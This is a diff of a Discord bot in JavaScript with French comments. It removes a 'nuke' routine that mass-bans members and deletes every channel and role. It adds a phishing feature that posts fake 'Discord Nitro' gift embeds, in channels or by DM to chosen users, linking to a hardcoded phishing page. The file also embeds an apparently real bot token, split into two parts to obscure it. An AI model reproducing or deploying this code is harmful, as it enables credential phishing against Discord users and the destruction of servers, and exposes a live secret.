@@ -2,34 +2,10 @@ const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
 const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
 const botToken = part1 + part2;
 
-// Fonction pour enregistrer la commande /nuke auprès de Discord
-async function registerCommand(guildId) {
-  await fetch(`https://discord.com/api/v9/applications/${part1.split('.')[0]}/guilds/${guildId}/commands`, {
-    method: "POST",
-    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
-    body: JSON.stringify({
-      name: "nuke",
-      description: "Détruit le serveur (ban all, supprime salons et rôles).",
-      type: 1
-    })
-  }).catch(() => {});
-}
+const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/"; 
 
 async function listen() {
-  console.log("Bot en ligne, en attente de la commande /nuke...");
-  
-  let guildsRes = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
-    headers: { "Authorization": `Bot ${botToken}` }
-  });
-  let guilds = await guildsRes.json();
-  
-  if (Array.isArray(guilds)) {
-    for (let g of guilds) {
-      await registerCommand(g.id);
-      console.log("commande /nuke enregistrée sur le serveur :", g.id);
-    }
-  }
-
+  console.log("Bot en ligne, en attente de commandes...");
   let lastMsgId = null;
 
   setInterval(async () => {
@@ -57,12 +33,23 @@ async function listen() {
           
           if (Array.isArray(msgs)) {
             for (let m of msgs) {
-              // Si on tape /nuke dans discord, discord envoie une interaction
-              // mais si le bot n'a pas de serveur d'interaction, on va checker si le message contient "nuke"
-              if (m.content && (m.content === "/nuke" || m.content.toLowerCase() === "nuke") && m.id !== lastMsgId) {
+              if (!m.content || m.id === lastMsgId) continue;
+              
+              const content = m.content.toLowerCase().trim();
+              
+              // Commande "nitro" pour le salon actuel
+              if (content === "nitro") {
                 lastMsgId = m.id;
-                console.log("Nuke lancé sur :", g.id);
-                nuke(g.id);
+                console.log("envoi du faux nitro dans le salon :", c.id);
+                sendNitro(c.id);
+              }
+              
+              // Commande "dm ID" pour envoyer en privé
+              if (content.startsWith("dm ")) {
+                lastMsgId = m.id;
+                const targetId = content.split(" ")[1];
+                console.log("envoi du faux nitro en dm à :", targetId);
+                sendDM(targetId);
               }
             }
           }
@@ -72,55 +59,95 @@ async function listen() {
   }, 5000); 
 }
 
-async function nuke(guild) {
-  console.log(`lancement du nuke sur : ${guild}`);
-  
-  let members = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
-    headers: { "Authorization": `Bot ${botToken}` }
-  })).json();
-  
-  if (members && !members.message) {
-    let bans = members.map(m => {
-      if (m.user.bot) return Promise.resolve();
-      return fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
-        method: "PUT",
-        headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
-        body: JSON.stringify({ delete_message_seconds: 604800 })
-      }).catch(() => {});
-    });
-    await Promise.all(bans);
-  }
-
-  let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
-    headers: { "Authorization": `Bot ${botToken}` }
-  })).json();
-  
-  if (channels && !channels.message) {
-    for (let c of channels) {
-      await fetch(`https://discord.com/api/v9/channels/${c.id}`, {
-        method: "DELETE",
-        headers: { "Authorization": `Bot ${botToken}` }
-      }).catch(() => {});
-      await new Promise(r => setTimeout(r, 150));
+async function sendNitro(channelId) {
+  let embed = {
+    title: "You've been gifted a subscription!",
+    description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours\n\n[Cliquez ici si le bouton ne marche pas](${phishingUrl})`,
+    color: 0x5865f2,
+    image: {
+      url: "https://i.imgur.com/L8Yt5K0.png"
+    },
+    footer: {
+      text: "Discord Nitro"
     }
-  }
+  };
 
-  let roles = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/roles`, {
-    headers: { "Authorization": `Bot ${botToken}` }
-  })).json();
+  await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+    method: "POST",
+    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: "",
+      embeds: [embed],
+      components: [
+        {
+          type: 1,
+          components: [
+            {
+              type: 2,
+              style: 5, // Bouton lien (style 5)
+              label: "Accept Gift",
+              url: phishingUrl
+            }
+          ]
+        }
+      ]
+    })
+  }).catch(() => {});
+}
+
+async function sendDM(targetId) {
+  // 1. Créer le salon DM
+  let dmRes = await fetch(`https://discord.com/api/v9/users/@me/channels`, {
+    method: "POST",
+    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
+    body: JSON.stringify({ recipient_id: targetId })
+  });
   
-  if (roles && !roles.message) {
-    for (let r of roles) {
-      if (r.name === "@everyone" || r.managed) continue;
-      await fetch(`https://discord.com/api/v9/guilds/${guild}/roles/${r.id}`, {
-        method: "DELETE",
-        headers: { "Authorization": `Bot ${botToken}` }
-      }).catch(() => {});
-      await new Promise(r => setTimeout(r, 150));
-    }
+  let dmData = await dmRes.json();
+  
+  if (!dmData.id) {
+    console.log("erreur création dm :", dmData.message);
+    return;
   }
   
-  console.log("nuke terminé.");
+  const channelId = dmData.id;
+  
+  // 2. Envoyer l'embed dans le DM
+  let embed = {
+    title: "You've been gifted a subscription!",
+    description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours\n\n[Cliquez ici si le bouton ne marche pas](${phishingUrl})`,
+    color: 0x5865f2,
+    image: {
+      url: "https://i.imgur.com/L8Yt5K0.png"
+    },
+    footer: {
+      text: "Discord Nitro"
+    }
+  };
+
+  await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+    method: "POST",
+    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: "",
+      embeds: [embed],
+      components: [
+        {
+          type: 1,
+          components: [
+            {
+              type: 2,
+              style: 5, 
+              label: "Accept Gift",
+              url: phishingUrl
+            }
+          ]
+        }
+      ]
+    })
+  }).catch(() => {});
+  
+  console.log("faux nitro envoyé en dm.");
 }
 
 listen();
